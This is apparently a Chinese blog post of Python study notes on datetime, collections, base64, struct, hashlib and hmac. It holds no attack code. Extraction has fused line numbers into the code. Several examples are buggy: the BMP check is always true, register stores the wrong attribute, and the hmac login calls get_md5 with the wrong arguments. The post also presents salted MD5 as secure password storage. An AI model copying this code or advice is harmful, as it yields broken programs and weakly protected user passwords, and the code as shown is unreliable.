用内建库 datetime collection base64 struct hashlib itertolls contexlib urllib xml htmlparser","text":"python学习笔记，常用内建库 datetime collection base64 struct hashlib itertolls contexlib urllib xml htmlparser datetime 获取当前时间 123456from datetime import datetimenow = datetime.now() # 获取当前时间print(now) # 2021-08-17 09:10:59.819930print(type(now)) # &lt;class &#x27;datetime.datetime&#x27;&gt; datetime模块中包含一个datetime类，now()是datetime类中的一个方法。datetime.now()返回的是一个datetime类。 获取指定日期与时间 直接使用参数构造一个datetime对象即可： 12345from datetime import datetimedt = datetime(2015, 4, 19, 12, 20) # 用指定日期时间创建datetimeprint(dt) # 2015-04-19 12:20:00 datetime转换为timestamp `timestamp`时间戳时间戳是指格林威治时间1970年01月01日00时00分00秒起至当下的总秒数。通俗的讲， 时间戳是一份能够表示一份数据在一个特定时间点已经存在的完整的可验证的数据。 它的提出主要是为用户提供一份电子证据， 以证明用户的某些数据的产生时间。1970年1月1日 00:00:00 UTC+00:00时区的时刻称为epoch time，记为0（1970年以前的时间timestamp为负数） 即对数据产生的时间进行一个唯一认证，不可更改。 则北京时间的1970年01月01日00时00分00秒为： 11970-1-1 08:00:00 UTC+8:00 可见timestamp的值与时区毫无关系，因为timestamp一旦确定，其UTC时间就确定了，转换到任意时区的时间也是完全确定的，这就是为什么计算机存储的当前时间是以timestamp表示的，全球各地的计算机在任意时刻的timestamp都是完全相同的（假定时间已校准）。 转换的方式只需要调用timestamp()即可： 123456from datetime import datetimedt = datetime(2015, 4, 19, 12, 20) # 用指定日期时间创建datetimedt.timestamp() # 把datetime转换为timestamp# 1429417200.0 timestamp是一个浮点数，整数位表示秒。 某些编程语言（如Java和JavaScript）的timestamp使用整数表示毫秒数，这种情况下只需要把timestamp除以1000就得到Python的浮点表示方法。 timestamp转换为datetime 要把timestamp转换为datetime，使用datetime提供的fromtimestamp()方法： 12345from datetime import datetimet = 1429417200.0print(datetime.fromtimestamp(t)) # 2015-04-19 12:20:00 timestamp是没有时区的，而datetime是有市区的，使用fromtimestamp()方法转换后的时间是按照系统设置的当地时区进行转化的，同样也支持转化到UTC标准市区，即UTC+0:00： 12345678from datetime import datetimet = 1429417200.0print(datetime.fromtimestamp(t)) # 本地时间# 2015-04-19 12:20:00print(datetime.utcfromtimestamp(t)) # UTC时间# 2015-04-19 04:20:00 str转datetime 从前端传送的时间大多是String格式的时间，要处理日期和时间，首先必须把str转换为datetime。转换方法是通过datetime.strptime()实现，需要一个日期和时间的格式化字符串： 12345from datetime import datetimecday = datetime.strptime(&#x27;2015-6-1 18:19:59&#x27;, &#x27;%Y-%m-%d %H:%M:%S&#x27;)print(cday) # 2015-06-01 18:19:59 字符串'%Y-%m-%d %H:%M:%S'规定了日期和时间部分的格式。详细的说明请参考： python文档https://docs.python.org/3/library/datetime.html#strftime-strptime-behavior 注意转换后的datetime是没有时区信息的。 datetime转换为str 如果已经有了datetime对象，要把它格式化为字符串显示给用户，就需要转换为str，转换方法是通过strftime()实现的，同样需要一个日期和时间的格式化字符串： 12345from datetime import datetimenow = datetime.now()print(now.strftime(&#x27;%a, %b %d %H:%M&#x27;)) # Tue, Aug 17 09:10 datetime加减 对日期和时间进行加减实际上就是把datetime往后或往前计算，得到新的datetime。加减可以直接用+和-运算符，不过需要导入timedelta这个类： 12345678910&gt;&gt;&gt; from datetime import datetime, timedelta&gt;&gt;&gt; now = datetime.now()&gt;&gt;&gt; nowdatetime.datetime(2021, 8, 17, 10, 11, 27, 797823)&gt;&gt;&gt; now + timedelta(hours = 10)datetime.datetime(2021, 8, 17, 20, 11, 27, 797823)&gt;&gt;&gt; now - timedelta(days = 1)datetime.datetime(2021, 8, 16, 10, 11, 27, 797823)&gt;&gt;&gt; now + timedelta(days = 2, hours = 12)datetime.datetime(2021, 8, 19, 22, 11, 27, 797823) 可见，使用timedelta你可以很容易地算出前几天和后几天的时刻。 本地时间转换为UTC时间 本地时间是指系统设定时区的时间，例如北京时间是UTC+8:00时区的时间，而UTC时间指UTC+0:00时区的时间。 一个datetime类型有一个时区属性tzinfo，但是默认为None，所以无法区分这个datetime到底是哪个时区，除非强行给datetime设置一个时区，该参数需要接收一个timezone类型的对象： 12345678&gt;&gt;&gt; from datetime import datetime, timedelta, timezone&gt;&gt;&gt; tz_utc_8 = timezone(timedelta(hours=8)) # 创建时区UTC+8:00&gt;&gt;&gt; now = datetime.now()&gt;&gt;&gt; nowdatetime.datetime(2015, 5, 18, 17, 2, 10, 871012)&gt;&gt;&gt; dt = now.replace(tzinfo=tz_utc_8) # 强制设置为UTC+8:00&gt;&gt;&gt; dtdatetime.datetime(2015, 5, 18, 17, 2, 10, 871012, tzinfo=datetime.timezone(datetime.timedelta(0, 28800))) 如果系统时区恰好是UTC+8:00，那么上述代码就是正确的，否则，不能强制设置为UTC+8:00时区。 时区转换 我们可以先通过utcnow()拿到当前的UTC时间，再转换为任意时区的时间： 12345678910111213141516# 拿到UTC时间，并强制设置时区为UTC+0:00:&gt;&gt;&gt; utc_dt = datetime.utcnow().replace(tzinfo=timezone.utc)&gt;&gt;&gt; print(utc_dt)2021-08-17 02:34:19.972780+00:00# astimezone()将转换时区为北京时间:&gt;&gt;&gt; bj_dt = utc_dt.astimezone(timezone(timedelta(hours=8)))&gt;&gt;&gt; print(bj_dt)2021-08-17 10:34:19.972780+08:00# astimezone()将转换时区为东京时间:&gt;&gt;&gt; tokyo_dt = utc_dt.astimezone(timezone(timedelta(hours=9)))&gt;&gt;&gt; print(tokyo_dt)2021-08-17 11:34:19.972780+09:00# astimezone()将bj_dt转换时区为东京时间:&gt;&gt;&gt; tokyo_dt2 = bj_dt.astimezone(timezone(timedelta(hours=9)))&gt;&gt;&gt; print(tokyo_dt2)2021-08-17 11:34:19.972780+09:00 时区转换的关键在于，拿到一个datetime时，要获知其正确的时区，然后强制设置时区，作为基准时间。 利用带时区的datetime，通过astimezone()方法，可以转换到任意时区。 注：不是必须从UTC+0:00时区转换到其他时区，任何带时区的datetime都可以正确转换，例如上述bj_dt到tokyo_dt的转换。 练习 例如假设你获取了用户输入的日期和时间如2015-1-21 9:01:30，以及一个时区信息如UTC+5:00，均是str，请编写一个函数将其转换为timestamp： 12345678910111213141516171819202122# Hello.py# -*- coding:utf-8 -*-import refrom datetime import datetime, timezone, timedeltadef to_timestamp(dt_str, tz_str): timeNow = datetime.strptime(dt_str, &#x27;%Y-%m-%d %H:%M:%S&#x27;) tz = re.match(r&#x27;UTC(\\+|\\-)0?(\\d&#123;1,2&#125;):00&#x27;, tz_str) tz = int((str(tz[1])+str(tz[2]))) dt = timeNow.replace(tzinfo=timezone(timedelta(hours=tz))) return dt.timestamp()# 测试:t1 = to_timestamp(&#x27;2015-6-1 08:10:30&#x27;, &#x27;UTC+7:00&#x27;)assert t1 == 1433121030.0, t1t2 = to_timestamp(&#x27;2015-5-31 16:10:30&#x27;, &#x27;UTC-09:00&#x27;)assert t2 == 1433121030.0, t2print(&#x27;ok&#x27;) collection collections是Python内建的一个集合模块，提供了许多有用的集合类。 namedtuple tuple可以表示不变集合，比如二位坐标 而namedtuple则允许我们为tuple设置一个名字。 1234567&gt;&gt;&gt; from collections import namedtuple&gt;&gt;&gt; Point = namedtuple(&#x27;Point&#x27;, [&#x27;x&#x27;, &#x27;y&#x27;])&gt;&gt;&gt; p = Point(1, 2)&gt;&gt;&gt; p.x1&gt;&gt;&gt; p.y2 namedtuple是一个函数，它用来创建一个自定义的tuple对象，并且规定了tuple元素的个数，并可以用属性而不是索引来引用tuple的某个元素。 可以验证namedtuple是tuple的子类： 1234&gt;&gt;&gt; isinstance(p, Point)True&gt;&gt;&gt; isinstance(p, tuple)True deque python中list为线性表，在访问时速度很快，但在插入和删除时速度比较慢 python中提供了一种deque双向链表，能够实现搞笑的插入和删除，适用于栈和队列。 123456&gt;&gt;&gt; from collections import deque&gt;&gt;&gt; q = deque([&#x27;a&#x27;, &#x27;b&#x27;, &#x27;c&#x27;])&gt;&gt;&gt; q.append(&#x27;x&#x27;)&gt;&gt;&gt; q.appendleft(&#x27;y&#x27;)&gt;&gt;&gt; qdeque([&#x27;y&#x27;, &#x27;a&#x27;, &#x27;b&#x27;, &#x27;c&#x27;, &#x27;x&#x27;]) 对尾部进行增删时可使用append()和pop()方法，而对头部进行增删时则可使用appendleft()和popleft()方法 defaultdict defaultdict在dict的基础上，当发生keyerror异常时，允许设置自定义返回值： 1234567&gt;&gt;&gt; from collections import defaultdict&gt;&gt;&gt; dd = defaultdict(lambda: &#x27;N/A&#x27;)&gt;&gt;&gt; dd[&#x27;key1&#x27;] = &#x27;abc&#x27;&gt;&gt;&gt; dd[&#x27;key1&#x27;] # key1存在&#x27;abc&#x27;&gt;&gt;&gt; dd[&#x27;key2&#x27;] # key2不存在，返回默认值&#x27;N/A&#x27; 注意默认值是调用函数返回的，而函数在创建defaultdict对象时传入。 除了在Key不存在时返回默认值，defaultdict的其他行为跟dict是完全一样的。 OrderedDict 普通的dict中，key时无序的，迭代dict时无法确定key的顺序，如果需要保持则需要使用OrderedDict： 1234567&gt;&gt;&gt; from collections import OrderedDict&gt;&gt;&gt; d = dict([(&#x27;a&#x27;, 1), (&#x27;b&#x27;, 2), (&#x27;c&#x27;, 3)])&gt;&gt;&gt; d # dict的Key是无序的&#123;&#x27;a&#x27;: 1, &#x27;c&#x27;: 3, &#x27;b&#x27;: 2&#125;&gt;&gt;&gt; od = OrderedDict([(&#x27;a&#x27;, 1), (&#x27;b&#x27;, 2), (&#x27;c&#x27;, 3)])&gt;&gt;&gt; od # OrderedDict的Key是有序的OrderedDict([(&#x27;a&#x27;, 1), (&#x27;b&#x27;, 2), (&#x27;c&#x27;, 3)]) OrderedDict的Key会按照插入的顺序排列： 123456&gt;&gt;&gt; od = OrderedDict()&gt;&gt;&gt; od[&#x27;z&#x27;] = 1&gt;&gt;&gt; od[&#x27;y&#x27;] = 2&gt;&gt;&gt; od[&#x27;x&#x27;] = 3&gt;&gt;&gt; list(od.keys()) # 按照插入的Key的顺序返回[&#x27;z&#x27;, &#x27;y&#x27;, &#x27;x&#x27;] rderedDict可以实现一个FIFO（先进先出）的dict，当容量超出限制时，先删除最早添加的key： 12345678910111213141516171819from collections import OrderedDictclass LastUpdatedOrderedDict(OrderedDict): def __init__(self, capacity): super(LastUpdatedOrderedDict, self).__init__() self._capacity = capacity def __setitem__(self, key, value): containsKey = 1 if key in self else 0 if len(self) - containsKey &gt;= self._capacity: last = self.popitem(last=False) print(&#x27;remove:&#x27;, last) if containsKey: del self[key] print(&#x27;set:&#x27;, (key, value)) else: print(&#x27;add:&#x27;, (key, value)) OrderedDict.__setitem__(self, key, value) ChainMap ChainMap可以把一组dict串起来并组成一个逻辑上的dict。ChainMap本身也是一个dict，但是查找的时候，会按照顺序在内部的dict依次查找。 ChainMap可以用于实现参数的优先级查找，例如：应用程序往往都需要传入参数，参数可以通过命令行传入，可以通过环境变量传入，还可以有默认参数。我们可以用ChainMap实现参数的优先级查找，即先查命令行参数，如果没有传入，再查环境变量，如果没有，就使用默认参数。 举例如下： 12345678910111213141516171819202122from collections import ChainMapimport os, argparse# 构造缺省参数:defaults = &#123; &#x27;color&#x27;: &#x27;red&#x27;, &#x27;user&#x27;: &#x27;guest&#x27;&#125;# 构造命令行参数:parser = argparse.ArgumentParser()parser.add_argument(&#x27;-u&#x27;, &#x27;--user&#x27;)parser.add_argument(&#x27;-c&#x27;, &#x27;--color&#x27;)namespace = parser.parse_args()command_line_args = &#123; k: v for k, v in vars(namespace).items() if v &#125;# 组合成ChainMap:combined = ChainMap(command_line_args, os.environ, defaults)# 打印参数:print(&#x27;color=%s&#x27; % combined[&#x27;color&#x27;])print(&#x27;user=%s&#x27; % combined[&#x27;user&#x27;]) 没有任何参数时，打印出默认参数： 123$ python3 use_chainmap.py color=reduser=guest 当传入命令行参数时，优先使用命令行参数： 123$ python3 use_chainmap.py -u bobcolor=reduser=bob 同时传入命令行参数和环境变量，命令行参数的优先级较高： 123$ user=admin color=green python3 use_chainmap.py -u bobcolor=greenuser=bob Counter Counter是一个简单的计数器，例如，统计字符出现的个数： 12345678910&gt;&gt;&gt; from collections import Counter&gt;&gt;&gt; c = Counter()&gt;&gt;&gt; for ch in &#x27;programming&#x27;:... c[ch] = c[ch] + 1...&gt;&gt;&gt; cCounter(&#123;&#x27;g&#x27;: 2, &#x27;m&#x27;: 2, &#x27;r&#x27;: 2, &#x27;a&#x27;: 1, &#x27;i&#x27;: 1, &#x27;o&#x27;: 1, &#x27;n&#x27;: 1, &#x27;p&#x27;: 1&#125;)&gt;&gt;&gt; c.update(&#x27;hello&#x27;) # 也可以一次性update&gt;&gt;&gt; cCounter(&#123;&#x27;r&#x27;: 2, &#x27;o&#x27;: 2, &#x27;g&#x27;: 2, &#x27;m&#x27;: 2, &#x27;l&#x27;: 2, &#x27;p&#x27;: 1, &#x27;a&#x27;: 1, &#x27;i&#x27;: 1, &#x27;n&#x27;: 1, &#x27;h&#x27;: 1, &#x27;e&#x27;: 1&#125;) Counter实际上也是dict的一个子类，上面的结果可以看出每个字符出现的次数。 Base64 Base64是一种用64个字符来表示任意二进制数据的方法。 通常用记事本打开exe、jpg、pdf等文件会看到一些乱码，这是因为二进制文件包含很多无法显示和打印的字符，如果需要让文本处理软件能够处理二进制数据，就需要一个二进制转字符串的方法，Base64就是一种最常见的二进制编码方法 Base64原理 Base64的原理很简单，首先，准备一个包含64个字符的数组： 1[&#x27;A&#x27;, &#x27;B&#x27;, &#x27;C&#x27;, ... &#x27;a&#x27;, &#x27;b&#x27;, &#x27;c&#x27;, ... &#x27;0&#x27;, &#x27;1&#x27;, ... &#x27;+&#x27;, &#x27;/&#x27;] 然后，对二进制数据进行处理，每3个字节一组，一共是3x8=24bit，划为4组，每组正好6个bit： base64-encode 这样我们得到4个数字作为索引，然后查表，获得相应的4个字符，就是编码后的字符串。 所以，Base64编码会把3字节的二进制数据编码为4字节的文本数据，长度增加33%，好处是编码后的文本数据可以在邮件正文、网页等直接显示。 原本长为3×8=243 \\times 8 = 243×8=24​bit的二进制序列，重新划分为4组，则每组6bit，则每组需要增加2bit来构成一个新的字节，则增长2×4=82 \\times 4 = 82×4=8​bit，则增长8/24∗100%=33.3333%8/24 *100\\% = 33.3333\\%8/24∗100%=33.3333%​ 如果要编码的二进制数据不是3的倍数，最后会剩下1个或2个字节怎么办？Base64用\\x00字节在末尾补足后，再在编码的末尾加上1个或2个=号，表示补了多少字节，解码的时候，会自动去掉。 Base64使用 Python内置的base64可以直接进行base64的编解码： 12345&gt;&gt;&gt; import base64&gt;&gt;&gt; base64.b64encode(b&#x27;binary\\x00string&#x27;)b&#x27;YmluYXJ5AHN0cmluZw==&#x27;&gt;&gt;&gt; base64.b64decode(b&#x27;YmluYXJ5AHN0cmluZw==&#x27;)b&#x27;binary\\x00string&#x27; 由于标准的Base64编码后可能出现字符+和/，在URL中就不能直接作为参数，所以又有一种&quot;url safe&quot;的base64编码，其实就是把字符+和/分别变成-和_： 123456&gt;&gt;&gt; base64.b64encode(b&#x27;i\\xb7\\x1d\\xfb\\xef\\xff&#x27;)b&#x27;abcd++//&#x27;&gt;&gt;&gt; base64.urlsafe_b64encode(b&#x27;i\\xb7\\x1d\\xfb\\xef\\xff&#x27;)b&#x27;abcd--__&#x27;&gt;&gt;&gt; base64.urlsafe_b64decode(&#x27;abcd--__&#x27;)b&#x27;i\\xb7\\x1d\\xfb\\xef\\xff&#x27; 还可以自己定义64个字符的排列顺序，这样就可以自定义Base64编码，不过，通常情况下完全没有必要。 Base64是一种通过查表的编码方法，不能用于加密，即使使用自定义的编码表也不行。 Base64适用于小段内容的编码，比如数字证书签名、Cookie的内容等。 由于=字符也可能出现在Base64编码中，但=用在URL、Cookie里面会造成歧义，所以，很多Base64编码后会把=去掉： 1234# 标准Base64:&#x27;abcd&#x27; -&gt; &#x27;YWJjZA==&#x27;# 自动去掉=:&#x27;abcd&#x27; -&gt; &#x27;YWJjZA&#x27; 去掉=后怎么解码呢？因为Base64是把3个字节变为4个字节，所以，Base64编码的长度永远是4的倍数，因此，需要加上=把Base64字符串的长度变为4的倍数，就可以正常解码了。 12345678910111213141516171819# -*- coding: utf-8 -*-import base64def safe_base64_decode(s): # 拿到去掉=后的base64字符串后，为其自动补充= l = len(s) n = 4 - l%4 if not n == 4: while n: s += &#x27;=&#x27; n -= 1 print(s) return base64.b64decode(s)# 测试:assert b&#x27;abcd&#x27; == safe_base64_decode(&#x27;YWJjZA==&#x27;), safe_base64_decode(&#x27;YWJjZA==&#x27;)assert b&#x27;abcd&#x27; == safe_base64_decode(&#x27;YWJjZA&#x27;), safe_base64_decode(&#x27;YWJjZA&#x27;)print(&#x27;ok&#x27;) Base64是一种任意二进制到文本字符串的编码方法，常用于在URL、Cookie、网页中传输少量二进制数据。 struct 准确地讲，Python没有专门处理字节的数据类型。但由于b'str'可以表示字节，所以，字节数组＝二进制str。而在C语言中，我们可以很方便地用struct、union来处理字节，以及字节和int，float的转换。 在Python中，比方说要把一个32位无符号整数变成字节，也就是4个长度的bytes，你得配合位运算符这么写： 12345678&gt;&gt;&gt; n = 10240099&gt;&gt;&gt; b1 = (n &amp; 0xff000000) &gt;&gt; 24&gt;&gt;&gt; b2 = (n &amp; 0xff0000) &gt;&gt; 16&gt;&gt;&gt; b3 = (n &amp; 0xff00) &gt;&gt; 8&gt;&gt;&gt; b4 = n &amp; 0xff&gt;&gt;&gt; bs = bytes([b1, b2, b3, b4])&gt;&gt;&gt; bsb&#x27;\\x00\\x9c@c&#x27; 非常麻烦。如果换成浮点数就无能为力了。 好在Python提供了一个struct模块来解决bytes和其他二进制数据类型的转换。 struct的pack函数把任意数据类型变成bytes： 123&gt;&gt;&gt; import struct&gt;&gt;&gt; struct.pack(&#x27;&gt;I&#x27;, 10240099)b&#x27;\\x00\\x9c@c&#x27; pack的第一个参数是处理指令，'&gt;I'的意思是： &gt;表示字节顺序是big-endian，也就是网络序（大端），I表示4字节无符号整数。 下面我们复习一下内存中的两种存储顺序 字节顺序 big-endian：字节存储方式为大端在末尾，即顺序存储，第一个字节存储在开头位置，如 01234567，存储为 01 23 45 67（即权重高的位在前） little-endian：字节存储方式为小端在末尾，即逆序存储，第一个字节存储在末尾位置，如 01234567，存储为 67 45 23 01（即权重低的位在前） struct应用 后面的参数个数要和处理指令一致。 unpack把bytes变成相应的数据类型： 12&gt;&gt;&gt; struct.unpack(&#x27;&gt;IH&#x27;, b&#x27;\\xf0\\xf0\\xf0\\xf0\\x80\\x80&#x27;)(4042322160, 32896) 根据&gt;IH的说明，后面的bytes依次变为I：4字节无符号整数和H：2字节无符号整数。 所以，尽管Python不适合编写底层操作字节流的代码，但在对性能要求不高的地方，利用struct就方便多了。 struct模块定义的数据类型可以参考Python官方文档： struct模块https://docs.python.org/3/library/struct.html#format-characters Windows的位图文件（.bmp）是一种非常简单的文件格式，我们来用struct分析一下。 首先找一个bmp文件，没有的话用“画图”画一个。 读入前30个字节来分析： 1&gt;&gt;&gt; s = b&#x27;\\x42\\x4d\\x38\\x8c\\x0a\\x00\\x00\\x00\\x00\\x00\\x36\\x00\\x00\\x00\\x28\\x00\\x00\\x00\\x80\\x02\\x00\\x00\\x68\\x01\\x00\\x00\\x01\\x00\\x18\\x00&#x27; BMP格式采用小端方式存储数据，文件头的结构按顺序如下： 两个字节：'BM'表示Windows位图，'BA'表示OS/2位图； 一个4字节整数：表示位图大小； 一个4字节整数：保留位，始终为0； 一个4字节整数：实际图像的偏移量； 一个4字节整数：Header的字节数； 一个4字节整数：图像宽度； 一个4字节整数：图像高度； 一个2字节整数：始终为1； 一个2字节整数：颜色数。 所以，组合起来用unpack读取： 12&gt;&gt;&gt; struct.unpack(&#x27;&lt;ccIIIIIIHH&#x27;, s)(b&#x27;B&#x27;, b&#x27;M&#x27;, 691256, 0, 54, 40, 640, 360, 1, 24) 结果显示，b'B'、b'M'说明是Windows位图，位图大小为640x360，颜色数为24。 练习 接下来编写一个bmpinfo.py，可以检查任意文件是否是位图文件，如果是，打印出图片大小和颜色数作为练习： 1234567891011121314151617181920212223242526272829303132333435# -*- coding: utf-8 -*-import base64, structbmp_data = base64.b64decode(&#x27;Qk1oAgAAAAAAADYAAAAoAAAAHAAAAAoAAAABABAAAAAAADICAAASCwAAEgsAA&#x27; +&#x27;AAAAAAAAAAA/3//f/9//3//f/9//3//f/9//3//f/9//3//f/9//3//f/9//3//f/9//3/&#x27; +&#x27;/f/9//3//f/9//3//f/9/AHwAfAB8AHwAfAB8AHwAfP9//3//fwB8AHwAfAB8/3//f/9/A&#x27; + &#x27;HwAfAB8AHz/f/9//3//f/9//38AfAB8AHwAfAB8AHwAfAB8AHz/f/9//38AfAB8/3//f/9&#x27; +&#x27;//3//fwB8AHz/f/9//3//f/9//3//f/9/AHwAfP9//3//f/9/AHwAfP9//3//fwB8AHz/f&#x27; +&#x27;/9//3//f/9/AHwAfP9//3//f/9//3//f/9//38AfAB8AHwAfAB8AHwAfP9//3//f/9/AHw&#x27; +&#x27;AfP9//3//f/9//38AfAB8/3//f/9//3//f/9//3//fwB8AHwAfAB8AHwAfAB8/3//f/9//&#x27; +&#x27;38AfAB8/3//f/9//3//fwB8AHz/f/9//3//f/9//3//f/9/AHwAfP9//3//f/9/AHwAfP9&#x27; +&#x27;//3//fwB8AHz/f/9/AHz/f/9/AHwAfP9//38AfP9//3//f/9/AHwAfAB8AHwAfAB8AHwAf&#x27; +&#x27;AB8/3//f/9/AHwAfP9//38AfAB8AHwAfAB8AHwAfAB8/3//f/9//38AfAB8AHwAfAB8AHw&#x27; +&#x27;AfAB8/3//f/9/AHwAfAB8AHz/fwB8AHwAfAB8AHwAfAB8AHz/f/9//3//f/9//3//f/9//&#x27; +&#x27;3//f/9//3//f/9//3//f/9//3//f/9//3//f/9//3//f/9//3//f/9//38AAA==&#x27;)def bmp_info(data): data = data[0:30] byteStr = struct.unpack(&#x27;&lt;ccIIIIIIHH&#x27;, data) if byteStr[0] == b&#x27;B&#x27; and byteStr[1] == b&#x27;M&#x27; or b&#x27;A&#x27;: return &#123; &#x27;width&#x27;: byteStr[-4], &#x27;height&#x27;: byteStr[-3], &#x27;color&#x27;: byteStr[-1] &#125;# 测试bi = bmp_info(bmp_data)assert bi[&#x27;width&#x27;] == 28assert bi[&#x27;height&#x27;] == 10assert bi[&#x27;color&#x27;] == 16print(&#x27;ok&#x27;) hashlib python的hashlib提供了常见的摘要算法支持：MD5、SHA1等等 摘要算法 摘要算法，即哈希算法或者说散列算法。通过一个函数将任意长度的数据转化为一个长度固定的数据串（通常用16进制的字符串表示） 摘要算法作用 下面引用一个例子： 举个例子，你写了一篇文章，内容是一个字符串'how to use python hashlib - by Michael'，并附上这篇文章的摘要是'2d73d4f15c0db7f5ecb321b6a65e5d6d'。如果有人篡改了你的文章，并发表为'how to use python hashlib - by Bob'，你可以一下子指出Bob篡改了你的文章，因为根据'how to use python hashlib - by Bob'计算出的摘要不同于原始文章的摘要。 廖雪峰www.liaoxuefeng.com/wiki/1016959663602400/1017686752491744 总的来说，摘要算法的主要作用就是对任意长度数据data计算出固定长度的摘要digest，目的是为了发现原始数据是否被人篡改过。 需要注意的是，摘要算法通常是一个单向函数，即从原文本生成摘要相对容易，但从摘要生成原文非常困难。并且对原始数据做哪怕一个bit的修改，都会导致计算出的摘要完全不同。 摘要算法使用 先使用MD5算法计算一段文本的摘要： 123456import hashlibmd5 = hashlib.md5()md5.update(&#x27;how to use md5 in puthon hashlib&#x27;.encode(&#x27;utf-8&#x27;))print(md5) 计算结果如下： 1bd3c2bf3a86acaa6ee89efda6b5ceae4 如果数据量很大，可以分块多次调用update()，最后计算的结果是一样的： 123456import hashlibmd5 = hashlib.md5()md5.update(&#x27;how to use md5 in &#x27;.encode(&#x27;utf-8&#x27;))md5.update(&#x27;python hashlib?&#x27;.encode(&#x27;utf-8&#x27;))print(md5.hexdigest()) MD5是最常见的摘要算法，速度很快，生成结果是固定的128 bit字节，通常用一个32位的16进制字符串表示。 另一种常见的摘要算法是SHA1，调用SHA1和调用MD5完全类似： 123456import hashlibsha1 = hashlib.sha1()sha1.update(&#x27;how to use sha1 in &#x27;.encode(&#x27;utf-8&#x27;))sha1.update(&#x27;python hashlib?&#x27;.encode(&#x27;utf-8&#x27;))print(sha1.hexdigest()) SHA1的结果是160 bit字节，通常用一个40位的16进制字符串表示。 结果如下： 12c76b57293ce30acef38d98f6046927161b46a44 由于任何摘要算法都是把无限多的数据集合映射到一个有限的集合中。因此完全有可能发生两个不同的数据集通过某个摘要算法得到了相同的结果。这种情况称为碰撞，比如Bob试图根据你的摘要反推出一篇文章'how to learn hashlib in python - by Bob'，并且这篇文章的摘要恰好和你的文章完全一致，这种情况也并非不可能出现，但是非常非常困难。 摘要算法应用 摘要算法在数据持久化时应用广泛，比如为了保证平台用户的账号安全，通常不会将用户的密码明文存入数据库，通常会将其MD5摘要存入数据库。用户登陆时先计算出明文口令的MD5摘要，再与数据库中的摘要进行对比。 但是采用存储MD5口令摘要的方式也不一定安全。 黑客往往会保存一个MD5口令对应数据库，对于简单的密码，只需要对数据库进行暴力匹配便可得到有限个可能的选项。 例如： 明文 摘要 123456 e10adc3949ba59abbe56e057f20f883e 888888 21218cca77804d2ba1922c33e0151105 password 5f4dcc3b5aa765d61d8327deb882cf99 那么我们如何保护那些密码设置简单的用户呢？ 首先想到的有两条方案： 要求用户使用复杂密码 数据保护方使用特殊的方法避免简易密码遭泄露 方案一大多数网站都会使用，比如强制要求用户使用字母+数字+大小写+特殊字符的离奇组合。 这种方案虽然高效，但作为服务提供者，如此要求客户，这种做法显然无异于甩锅。 那么服务提供商们有了另一个做法，就是在你的口令中加盐： 12def calc_md5(password): return get_md5(password + &#x27;the-Salt&#x27;) 经过Salt处理的MD5口令，只要Salt不被黑客知道，即使用户输入简单口令，也很难通过MD5反推明文口令。 但是如果有两个用户都使用了相同的简单口令比如123456，在数据库中，将存储两条相同的MD5值，这说明这两个用户的口令是一样的。 那么我们可以用一个用户唯一的值作为盐，比如假定用户无法修改登录名，就可以通过把登录名作为Salt的一部分来计算MD5，从而实现相同口令的用户也存储不同的MD5。 现在我们模拟一下使用该方法的登陆与注册： 12345678910111213141516171819202122232425262728293031323334353637383940414243# -*- coding: utf-8 -*-import hashlib, random# 用户类class User(object): def __init__(self, username, password): self.username = username self.salt = &#x27;&#x27;.join([chr(random.randint(48, 122)) for i in range(20)]) self.password = get_md5(password + self.salt)# 模拟用户信息数据库db = &#123; &#x27;michael&#x27;: User(&#x27;michael&#x27;, &#x27;123456&#x27;), &#x27;bob&#x27;: User(&#x27;bob&#x27;, &#x27;abc999&#x27;), &#x27;alice&#x27;: User(&#x27;alice&#x27;, &#x27;alice2008&#x27;)&#125;# 根据用户输入的登录名和口令模拟用户注册，计算更安全的MD5def register(username, password): newUser = User(username, password) db[username] = User.password return newUser# 然后，根据修改后的MD5算法实现用户登录的验证def get_md5(s): return hashlib.md5(s.encode(&#x27;utf-8&#x27;)).hexdigest()# 登陆验证def login(username, password): user = db[username] return user.password == get_md5(password + user.salt)# 测试:assert login(&#x27;michael&#x27;, &#x27;123456&#x27;)assert login(&#x27;bob&#x27;, &#x27;abc999&#x27;)assert login(&#x27;alice&#x27;, &#x27;alice2008&#x27;)assert not login(&#x27;michael&#x27;, &#x27;1234567&#x27;)assert not login(&#x27;bob&#x27;, &#x27;123456&#x27;)assert not login(&#x27;alice&#x27;, &#x27;Alice2008&#x27;)print(&#x27;ok&#x27;) 需要注意的是摘要算法并不是加密算法，不能用于加密（因为无法解秘） hmac 上一节中，我们通过在口令中加入salt来保护一些比较简单的算法。实际上，Hmac算法也是通过一个标准算法， 在计算哈希的过程中，把key混入计算过程中。 和我们自定义的加salt算法不同，Hmac算法针对所有哈希算法都通用，无论是MD5还是SHA-1。采用Hmac替代我们自己的salt算法，可以使程序算法更标准化，也更安全。 python自带的hmac模块实现了标准的Hmac算法。 我们准备好原始信息，随机key，哈希算法，使用hmac的过程如下： 1234567import hmacmessage = b&#x27;Hello, world!&#x27;key = b&#x27;secret&#x27;h = hmac.new(key, message, digestmod = &#x27;MD5&#x27;)print(h.hexdigest()) 计算结果如下： 1fa4ee7d173f2d97ee79022d1a7355bcf 可见使用hmac和普通hash算法非常类似。hmac输出的长度和原始哈希算法的长度一致。需要注意传入的key和message都是bytes类型，str类型需要首先编码为bytes。 我们可以用hmac模块代替上一节提到的增加salt的方法： 12345678910111213141516171819202122232425262728293031323334353637383940414243# -*- coding: utf-8 -*-import hmac, random# 用户类class User(object): def __init__(self, username, password): self.username = username self.salt = &#x27;&#x27;.join([chr(random.randint(48, 122)) for i in range(20)]) self.password = hmac_md5(self.salt, password)# 模拟用户信息数据库db = &#123; &#x27;michael&#x27;: User(&#x27;michael&#x27;, &#x27;123456&#x27;), &#x27;bob&#x27;: User(&#x27;bob&#x27;, &#x27;abc999&#x27;), &#x27;alice&#x27;: User(&#x27;alice&#x27;, &#x27;alice2008&#x27;)&#125;# 根据用户输入的登录名和口令模拟用户注册，计算更安全的MD5def register(username, password): newUser = User(username, password) db[username] = User.password return newUser# 然后，根据修改后的MD5算法实现用户登录的验证def hmac_md5(key, s): return hmac.new(key.encode(&#x27;utf-8&#x27;), s.encode(&#x27;utf-8&#x27;), &#x27;MD5&#x27;).hexdigest()# 登陆验证def login(username, password): user = db[username] return user.password == get_md5(user.salt, password)# 测试:assert login(&#x27;michael&#x27;, &#x27;123456&#x27;)assert login(&#x27;bob&#x27;, &#x27;abc999&#x27;)assert login(&#x27;alice&#x27;, &#x27;alice2008&#x27;)assert not login(&#x27;michael&#x27;, &#x27;1234567&#x27;)assert not login(&#x27;bob&#x27;, &#x27;123456&#x27;)assert not login(&#x27;alice&#x27;, 